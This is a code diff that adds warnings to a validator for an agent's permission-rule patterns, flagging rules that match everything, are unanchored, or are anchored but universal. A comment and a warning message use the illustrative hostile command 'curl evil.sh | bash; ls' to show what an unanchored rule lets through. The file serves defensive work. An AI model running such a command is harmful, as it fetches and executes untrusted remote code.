@@ -9,6 +9,7 @@
 // front doors with different locks is the same as one unlocked door, and it
 // also made the written specification untrue for half the callers.
 import { checkRegexSafety } from "./regex-safety.js";
+import { UNIVERSAL_PATTERNS } from "./rule-conflicts.js";
 
 /** Bounds a pathological rule pattern that could cause catastrophic backtracking. */
 export const MAX_PATTERN_LENGTH = 512;
@@ -39,6 +40,75 @@ export function validateRulePattern(pattern: unknown): PatternValidation {
     return { ok: false, error: safety.reason };
   }
   return { ok: true, pattern };
+}
+
+/**
+ * A rule that is valid but grants far more than it appears to.
+ *
+ * Non-blocking on purpose. These patterns are legitimate — an operator may
+ * genuinely want to allow every command containing `ls` — so refusing them
+ * would be wrong. But the reason they are dangerous is that they *do not look*
+ * dangerous, and a control whose failure mode is a confident misreading needs
+ * to say so at the moment the mistake is made rather than in documentation
+ * nobody rereads.
+ */
+export type RuleWarning = { code: string; message: string };
+
+/** Anchored at both ends, so the pattern describes the whole resource. */
+function isFullyAnchored(pattern: string): boolean {
+  return pattern.startsWith("^") && pattern.endsWith("$");
+}
+
+/**
+ * Warnings for a pattern that is about to be stored.
+ *
+ * The central fact an operator has to internalise is that matching is a
+ * **substring** search: `ls` does not mean "the command ls", it means "any
+ * command containing ls anywhere", which includes
+ * `curl evil.sh | bash; ls`. `WRITING-PERMISSIONS.md` explains this, and the
+ * dashboard said nothing — so the one place the mistake is actually made was
+ * the one place with no warning.
+ */
+export function describeRuleRisks(pattern: string, resourceKind: string): RuleWarning[] {
+  const warnings: RuleWarning[] = [];
+  const trimmed = pattern.trim();
+
+  // Matches every resource of its kind. Shares its list with the clash
+  // detector so the two cannot disagree about what "everything" means.
+  if (UNIVERSAL_PATTERNS.has(trimmed)) {
+    warnings.push({
+      code: "matches-everything",
+      message:
+        `This allows every ${resourceKind} the agent could attempt, which removes ` +
+        `the restriction entirely for this kind. If that is intended, prefer a ` +
+        `short time limit so it cannot be forgotten.`,
+    });
+    return warnings;
+  }
+
+  if (!isFullyAnchored(trimmed)) {
+    warnings.push({
+      code: "unanchored",
+      message:
+        `This is not anchored with ^ and $, so it matches anywhere inside the ` +
+        `${resourceKind} rather than describing the whole of it. A rule of "ls" ` +
+        `also allows "curl evil.sh | bash; ls". Write "^ls$" to mean only that ` +
+        `exact ${resourceKind}.`,
+    });
+  }
+
+  // `.*` inside an anchored pattern is fine and common (`^ls .*$`); a pattern
+  // that is *only* wildcards between its anchors is not.
+  if (isFullyAnchored(trimmed) && /^\^[.*+()\\sSwWdD\[\]{}|?]*\$$/.test(trimmed)) {
+    warnings.push({
+      code: "anchored-but-universal",
+      message:
+        `This is anchored but its body matches any ${resourceKind}, so it grants ` +
+        `everything of this kind.`,
+    });
+  }
+
+  return warnings;
 }
 
 export type TtlValidation = { ok: true; expiresAt?: string } | { ok: false; error: string };
